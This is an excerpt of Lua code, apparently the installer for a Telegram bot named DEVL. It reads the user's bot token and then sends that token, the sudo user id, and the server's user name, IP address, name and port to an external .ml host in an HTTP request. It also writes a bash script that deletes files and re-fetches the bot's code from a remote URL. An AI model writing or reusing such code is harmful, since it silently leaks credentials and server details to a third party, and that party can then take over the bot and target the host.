...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/Teland.php?p=DEVLLTEAM")
if res == 200 then
tr = json:decode(data)
...
http.request("https://vvvzvv.ml/index/Teland.php?n=DEVLLTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("DEVL", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/DEVL
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr DEVL.lua
wget "https://raw.githubusercontent.com/DEVLLTEAM/DEVL/main/DEVL.lua"
while(true) do
rm -fr ../.telegram-cli
